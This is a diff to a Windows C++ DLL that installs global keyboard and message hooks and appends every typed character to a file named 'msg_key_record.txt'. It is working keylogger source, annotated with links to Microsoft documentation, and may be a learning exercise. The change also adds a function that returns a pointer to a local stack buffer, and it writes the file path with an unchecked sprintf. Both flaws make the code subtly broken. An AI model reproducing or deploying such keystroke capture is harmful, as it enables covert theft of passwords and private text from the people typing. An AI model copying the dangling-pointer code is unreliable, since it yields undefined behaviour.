@@ -7,9 +7,9 @@
 #include <stdio.h> 
 #include <process.h> 
 #include <string>
-//#include <Shlwapi.h>
-//
-//#pragma comment(lib, "shell32.lib")
+#include <Shlwapi.h>
+
+#pragma comment(lib, "Shlwapi.lib")
 
 static BOOL bHooked = FALSE;
 static HHOOK hhook = 0;
@@ -17,7 +17,7 @@ static HHOOK hhookMsg = 0;
 
 extern HINSTANCE hInst;
 
-std::string GetProgramRunDir(HMODULE hDllModule);
+char *GetProgramRunDir(HMODULE hDllModule);
 
 LRESULT CALLBACK KeyboardProc(int code, 
 	WPARAM wParam, 
@@ -33,9 +33,15 @@ KEYHOOK_API void SetKbHook(void)
 {
 	if (!bHooked)
 	{
+		// set keyboard hook
 		hhook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, hInst, (DWORD)NULL);
-		//hhookCBT = SetWindowsHookEx(WH_CBT, (HOOKPROC)CBTProc, hInst, (DWORD)NULL);
+		// for SetWindowsHookEx see https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
+		// for KeyboardProc see https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644984(v=vs.85)
+
+		// set message hook
 		hhookMsg = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, hInst, (DWORD)NULL);
+		// for GetMsgProc see https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644981(v=vs.85)
+
 		bHooked = TRUE;
 		DebugOutputMsg(_T("SetKbHook, bHooked = %d."), bHooked);
 	}
@@ -50,15 +56,20 @@ KEYHOOK_API void RemoveKbHook(void)
 }
 
 static int flag_capital =0;
+
+// for KeyboardProc see https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644984(v=vs.85)
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 {
+	// call next keyboard hook
 	LRESULT hr = CallNextHookEx(hhook, code, wParam, lParam);
+	// for CallNextHookEx see https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex
+
 	int flag_shift;
 	
-	if (code == HC_ACTION && lParam & 0x80000000)  //WM_KEYUP?
+	if (code == HC_ACTION && lParam & 0x80000000)  //WM_KEYUP
 	{
 		if ((wParam == VK_SHIFT)) {
-			flag_shift = 0x8000 & GetKeyState(VK_SHIFT);
+			flag_shift = 0x8000 & GetKeyState(VK_SHIFT); // for GetKeyState see https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate
 			DebugOutputMsg(_T("KeyboardProc, shift-key = %d "), flag_shift);
 		} 
 		if (wParam == VK_CAPITAL) {
@@ -89,39 +100,41 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 	return hr;
 }
 
+// for GetMsgProc see https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644981(v=vs.85)
 LRESULT CALLBACK GetMsgProc(
 	int nCode, // hook code
 	WPARAM wParam, // virtual-key code
 	LPARAM lParam // keystroke-message information
 	)
 {
+	// call next message hook
 	HRESULT hr = CallNextHookEx(hhookMsg, nCode, wParam, lParam);
 	if (nCode == HC_ACTION)
 	{
 		MSG * pMsg = (MSG *)lParam;
-		if (pMsg->message == WM_CHAR)
+		if (pMsg->message == WM_CHAR) // for WM_CHAR, see https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-char
 		{
-			char ch = (char)pMsg->wParam;
-			char pCh[2] = { 0 };
-			pCh[0] = ch;
-			pCh[1] = '\0';
+			char ch = (char)pMsg->wParam; // The character code of the key
 
-			DebugOutputMsg(_T("message hook, msg=%s"), pCh);
+			DebugOutputMsg(_T("message hook, msg=%c"), ch);
 
-			std::string curDir = GetProgramRunDir(hInst);
-			std::string msgFile = curDir + "msg_key_record.txt";
-			/*if (PathFileExists(msgFile.c_str())) {
+			// get the dir where current program exists
+			char * curDir = GetProgramRunDir(hInst);
+			char msgFile[MAX_PATH];
 
-			}*/
-			FILE * pFile = fopen(msgFile.c_str(), "a+");
+			// file path to write
+			sprintf(msgFile, "%s\\msg_key_record.txt", curDir);
+
+			// write the character into file
+			FILE * pFile = fopen(msgFile, "a+");
 			DWORD dwError = GetLastError();
 			if (dwError != 0) {
-				DebugOutputMsg(_T("savefile=%s,fopen error: %d"), msgFile.c_str(), dwError);
+				DebugOutputMsg(_T("savefile=%s,fopen error: %d"), msgFile, dwError);
 			}
 			
 			if (pFile)
 			{
-				fwrite(pCh, 1, strlen(pCh), pFile);
+				fwrite(&ch, 1, 1, pFile);
 				fclose(pFile);
 			}
 			else
@@ -133,13 +146,10 @@ LRESULT CALLBACK GetMsgProc(
 	return hr;
 }
 
-std::string GetProgramRunDir(HMODULE hDllModule)
+char * GetProgramRunDir(HMODULE hDllModule)
 {
-	TCHAR exeFullPath[MAX_PATH];
-	std::string strPath = _T("");
-
+	char exeFullPath[MAX_PATH];
 	GetModuleFileName(hDllModule, exeFullPath, MAX_PATH);
-	strPath = (std::string)exeFullPath;
-	int pos = strPath.find_last_of('\\', strPath.length());
-	return strPath.substr(0, pos + 1);
+	PathRemoveFileSpecA(exeFullPath);
+	return exeFullPath;
 }
